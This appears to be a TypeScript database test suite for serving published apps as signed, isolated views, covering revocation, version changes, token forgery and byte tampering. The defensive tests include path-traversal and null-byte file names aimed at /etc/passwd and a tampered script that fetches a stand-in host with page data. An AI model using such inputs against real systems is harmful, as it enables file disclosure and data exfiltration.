/**
 * Opening a published app against a real database: a person gets a view of
 * the app's current version, its files are served with the isolation headers
 * and nothing else, and every change to who may open the app or to the
 * version it shows ends the views opened before it on their next request.
 */
import { afterAll, expect, test } from 'bun:test';
import { createHash, randomBytes } from 'node:crypto';
import { chmod, mkdtemp, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import type { JsonObject } from '@melete/contracts';
import { Hono } from 'hono';
import { ServiceError } from '../../src/api/errors.ts';
import { mountApps } from '../../src/apps/routes.ts';
import { mountAppViews } from '../../src/apps/serve.ts';
import { recordId } from '../../src/broker/records.ts';
import { BrokerService } from '../../src/broker/service.ts';
import { createAppsConnector } from '../../src/connectors/apps.ts';
import { ConnectorRegistry } from '../../src/connectors/registry.ts';
import { LocalBlobStore } from '../../src/storage/local.ts';
import { isIsolated, isolated, VIEW_POLICY } from '../../src/viewer/headers.ts';
import { ViewTokens } from '../../src/viewer/tokens.ts';
import { seedJob } from '../helpers/broker.ts';
import { testDatabase } from '../helpers/database.ts';
import { installationOwner } from './space-removal-fixture.ts';

const fixture = await testDatabase();
const databaseTest = fixture ? test : test.skip;
const SLOW = 30_000;

afterAll(async () => {
  await fixture?.close();
}, 15_000);

const INDEX = '<!doctype html><title>Deals</title><script type="module" src="app.js"></script>';
const SCRIPT = 'document.title = "ready";';

async function person(email: string): Promise<string> {
  if (!fixture) throw new Error('Postgres fixture unavailable');
  const id = recordId('own');
  await fixture.sql`insert into principal (id, email) values (${id}, ${email})`;
  return id;
}

/** Alice publishes Deals for Bo. Cy has an account and nothing else. */
async function published(now: () => number = Date.now) {
  if (!fixture) throw new Error('Postgres fixture unavailable');
  const { sql } = fixture;
  const tag = recordId('x').slice(2).toLowerCase();
  const alice = await person(`alice-${tag}@example.test`);
  const bo = await person(`bo-${tag}@example.test`);
  const cy = await person(`cy-${tag}@example.test`);
  const seed = await seedJob(sql, { scopes: ['apps.publish', 'apps.rollback'], provider: 'apps' });
  await sql`update job set principal_id = ${alice} where id = ${seed.claims.job_id}`;
  await sql`update space set owner_principal_id = ${alice} where id = ${seed.claims.space_id}`;
  const roots = await mkdtemp(path.join(tmpdir(), 'melete-app-views-'));
  const workRoot = path.join(roots, 'work');
  const blobRoot = path.join(roots, 'blobs');
  const blobs = new LocalBlobStore(blobRoot);
  const connector = createAppsConnector({ sql, workRoot, blobs });
  const broker = new BrokerService({
    sql,
    connectors: new ConnectorRegistry().register(seed.connectionId, connector),
  });
  const write = (name: string, content: string) =>
    Bun.write(path.join(workRoot, seed.claims.job_id, 'app', name), content);
  const propose = (payload: JsonObject) =>
    broker.propose(seed.claims, {
      kind: 'apps.publish',
      connection_id: seed.connectionId,
      payload,
    });
  const publish = async (payload: JsonObject) => {
    const proposal = await broker.propose(seed.claims, {
      kind: 'apps.publish',
      connection_id: seed.connectionId,
      payload,
    });
    await broker.decide(proposal.action_id, {
      decision: 'approved',
      payload_hash: proposal.payload_hash,
    });
    await broker.admit(seed.claims, proposal.action_id, proposal.payload_hash);
    const done = await broker.dispatch(proposal.action_id);
    expect(done.status).toBe('succeeded');
  };
  await write('index.html', INDEX);
  await write('app.js', SCRIPT);
  await publish({
    dir: 'app',
    name: 'Deals',
    audience: { kind: 'people', emails: [`bo-${tag}@example.test`] },
  });
  const [row] = await sql<{ id: string; current_version_id: string }[]>`select id,
    current_version_id from app where space_id = ${seed.claims.space_id}`;
  if (!row) throw new Error('the app was not published');

  // The service as a browser reaches it: the isolation first, a session only when one is named.
  const service = new Hono();
  service.use('/apps/view/*', isolated);
  service.onError((error, c) =>
    error instanceof ServiceError
      ? c.json({ error: { code: error.code, message: error.message } }, error.status)
      : c.json({ error: { code: 'internal_error', message: 'failed' } }, 500),
  );
  // Each person signs in with a browser session of their own, as the service records one.
  const owner = await installationOwner(sql);
  const digests = new Map<string, string>();
  for (const who of [alice, bo, cy]) {
    const digest = createHash('sha256').update(randomBytes(32).toString('base64url')).digest('hex');
    await sql`insert into session (token_hash, principal_id, owner_id, expires_at)
      values (${digest}, ${who}, ${owner}, now() + interval '30 days')`;
    digests.set(who, digest);
  }
  const signOut = (who: string) =>
    sql`delete from session where token_hash = ${digests.get(who) ?? ''}`;
  service.use('*', async (c, next) => {
    const as = c.req.header('x-test-as');
    if (as) c.set('owner' as never, { id: as } as never);
    // An assistant's bearer token names the person but carries no browser session.
    const digest = as && !c.req.header('x-test-bearer') ? digests.get(as) : undefined;
    if (digest) c.set('sessionDigest' as never, digest as never);
    await next();
  });
  mountApps(service, { sql });
  mountAppViews(service, { sql, blobs, tokens: new ViewTokens('k'.repeat(64), now) });

  const as =
    (who: string, bearer = false) =>
    (route: string, init?: { method?: string; body?: unknown }) =>
      service.request(route, {
        method: init?.method ?? 'GET',
        headers: {
          'x-test-as': who,
          ...(bearer ? { 'x-test-bearer': '1' } : {}),
          ...(init?.body ? { 'content-type': 'application/json' } : {}),
        },
        ...(init?.body ? { body: JSON.stringify(init.body) } : {}),
      });
  /** A view for `who`, as the Apps screen asks for one. */
  const open = async (who: string) => {
    const response = await as(who)(`/apps/${row.id}/views`, { method: 'POST' });
    expect(response.status).toBe(200);
    return (await response.json()) as { view_path: string; version_id: string; expires_at: string };
  };
  /** A file read as the framed page makes it: no session, and the browser's own destination. */
  const load = (viewPath: string, file = 'index.html', destination: string | null = 'iframe') =>
    service.request(viewPath.replace(/index\.html$/, file), {
      headers: destination ? { 'sec-fetch-dest': destination } : {},
    });
  return {
    ...seed,
    sql,
    tag,
    alice,
    bo,
    cy,
    app: row,
    as,
    open,
    load,
    write,
    publish,
    blobRoot,
    signOut,
    propose,
  };
}

databaseTest(
  'an app opens as a view of its current version, its files served isolated and nothing else',
  async () => {
    const ctx = await published();
    const view = await ctx.open(ctx.bo);
    expect(view.version_id).toBe(ctx.app.current_version_id);
    expect(view.view_path).toMatch(/^\/apps\/view\/[A-Za-z0-9._-]+\/index\.html$/);

    const page = await ctx.load(view.view_path);
    expect(page.status).toBe(200);
    expect(await page.text()).toBe(INDEX);
    expect(page.headers.get('content-security-policy')).toBe(VIEW_POLICY);
    expect(page.headers.get('content-type')).toBe('text/html; charset=utf-8');
    expect(page.headers.get('x-content-type-options')).toBe('nosniff');
    expect(page.headers.has('set-cookie')).toBe(false);
    expect(page.headers.has('access-control-allow-origin')).toBe(false);

    const script = await ctx.load(view.view_path, 'app.js', 'script');
    expect(await script.text()).toBe(SCRIPT);
    expect(script.headers.get('access-control-allow-origin')).toBe('*');
    expect(isIsolated(script.headers)).toBe(true);

    // A file the version does not hold, or one outside it, is no file at all.
    for (const file of ['missing.js', '..%2F..%2Fetc%2Fpasswd', 'index.html%00.js']) {
      const missing = await ctx.load(view.view_path, file);
      expect(missing.status).toBe(404);
      expect(isIsolated(missing.headers)).toBe(true);
    }

    // The publisher opens it too; someone it was not shared with cannot.
    expect((await ctx.open(ctx.alice)).version_id).toBe(ctx.app.current_version_id);
    expect((await ctx.as(ctx.cy)(`/apps/${ctx.app.id}/views`, { method: 'POST' })).status).toBe(
      404,
    );
  },
  SLOW,
);

databaseTest(
  'revoking a viewer stops their open view on the next request',
  async () => {
    const ctx = await published();
    const bo = await ctx.open(ctx.bo);
    const alice = await ctx.open(ctx.alice);
    expect((await ctx.load(bo.view_path)).status).toBe(200);

    const changed = await ctx.as(ctx.alice)(`/apps/${ctx.app.id}/grants`, {
      method: 'PUT',
      body: { grants: [] },
    });
    expect(changed.status).toBe(200);

    const after = await ctx.load(bo.view_path, 'app.js', 'script');
    expect(after.status).toBe(404);
    expect(isIsolated(after.headers)).toBe(true);
    expect(await after.text()).not.toContain(SCRIPT);
    expect((await ctx.as(ctx.bo)(`/apps/${ctx.app.id}/views`, { method: 'POST' })).status).toBe(
      404,
    );
    // Any change to the list ends every open view; the publisher opens a fresh one.
    expect((await ctx.load(alice.view_path)).status).toBe(404);
    expect((await ctx.load((await ctx.open(ctx.alice)).view_path)).status).toBe(200);
  },
  SLOW,
);

databaseTest(
  'a new current version ends the views of the one before',
  async () => {
    const ctx = await published();
    const before = await ctx.open(ctx.bo);
    await ctx.write('index.html', '<!doctype html><title>Deals, second</title>');
    await ctx.publish({ dir: 'app', name: 'Deals', app_id: ctx.app.id });

    expect((await ctx.load(before.view_path)).status).toBe(404);
    const now = await ctx.open(ctx.bo);
    expect(now.version_id).not.toBe(before.version_id);
    expect(await (await ctx.load(now.view_path)).text()).toContain('Deals, second');

    // Choosing the first version again from the Apps screen does the same.
    const back = await ctx.as(ctx.alice)(`/apps/${ctx.app.id}/current`, {
      method: 'POST',
      body: { version_id: before.version_id },
    });
    expect(back.status).toBe(200);
    expect((await ctx.load(now.view_path)).status).toBe(404);
  },
  SLOW,
);

databaseTest(
  'a file asked for as a page of its own, rather than framed, is refused',
  async () => {
    const ctx = await published();
    const view = await ctx.open(ctx.bo);
    for (const destination of ['document', 'embed', 'object', null]) {
      const response = await ctx.load(view.view_path, 'index.html', destination);
      expect(response.status).toBe(403);
      expect(isIsolated(response.headers)).toBe(true);
      expect(await response.text()).not.toContain('<title>Deals');
    }
  },
  SLOW,
);

databaseTest(
  'an expired, forged or changed view is refused, and so are changed bytes',
  async () => {
    let clock = Date.now();
    const ctx = await published(() => clock);
    const view = await ctx.open(ctx.bo);
    const token = view.view_path.split('/')[3] as string;

    // Signed by another key, or edited: refused.
    const other = new ViewTokens('j'.repeat(64)).issue({
      principalId: ctx.bo,
      appId: ctx.app.id,
      versionId: view.version_id,
      grantGeneration: 1,
      sessionTag: 'f'.repeat(32),
    }).token;
    expect((await ctx.load(view.view_path.replace(token, other))).status).toBe(404);
    expect((await ctx.load(view.view_path.replace(token, `${token}x`))).status).toBe(404);

    // Bytes on disk that no longer hash to the manifest are never sent.
    const sha = new Bun.CryptoHasher('sha256').update(SCRIPT).digest('hex');
    const stored = path.join(ctx.blobRoot, 'sha256', sha.slice(0, 2), sha.slice(2, 4), sha);
    await chmod(stored, 0o600);
    await writeFile(stored, 'fetch("https://elsewhere.example/" + document.title)//');
    const changed = await ctx.load(view.view_path, 'app.js', 'script');
    expect(changed.status).toBe(500);
    expect(isIsolated(changed.headers)).toBe(true);
    expect(await changed.text()).not.toContain('elsewhere');

    // Twelve hours on, the view has ended.
    clock += 12 * 60 * 60 * 1000;
    expect((await ctx.load(view.view_path)).status).toBe(404);
  },
  SLOW,
);

databaseTest(
  'an open view keeps loading its files for as long as its session lasts',
  async () => {
    let clock = Date.now();
    const ctx = await published(() => clock);
    const view = await ctx.open(ctx.bo);
    // Well past the quarter hour a view once lasted: a reload, a second page or a late image still loads.
    clock += 3 * 60 * 60 * 1000;
    expect((await ctx.load(view.view_path)).status).toBe(200);
    expect((await ctx.load(view.view_path, 'app.js', 'script')).status).toBe(200);

    // Signing out ends it on the next request; another person's view goes on.
    await ctx.signOut(ctx.bo);
    expect((await ctx.load(view.view_path)).status).toBe(404);
    expect((await ctx.load((await ctx.open(ctx.alice)).view_path)).status).toBe(200);
  },
  SLOW,
);

databaseTest(
  'only a browser session can open a view',
  async () => {
    const ctx = await published();
    const response = await ctx.as(ctx.bo, true)(`/apps/${ctx.app.id}/views`, { method: 'POST' });
    expect(response.status).toBe(403);
  },
  SLOW,
);

databaseTest(
  'publishing code that opens WebRTC connections asks with a warning, and is not refused',
  async () => {
    const ctx = await published();
    await ctx.write('call.js', 'new RTCPeerConnection({ iceServers: [{ urls: "stun:x" }] });');
    const asked = await ctx.propose({ dir: 'app', name: 'Deals', app_id: ctx.app.id });
    expect(asked.status).toBe('needs_approval');
    expect(asked.canonical_payload.opens_connections).toEqual(['call.js']);
    // Without it, the field is not there at all.
    await ctx.write('call.js', 'document.title = "calls";');
    const plain = await ctx.propose({ dir: 'app', name: 'Deals', app_id: ctx.app.id });
    expect(plain.canonical_payload).not.toHaveProperty('opens_connections');
  },
  SLOW,
);
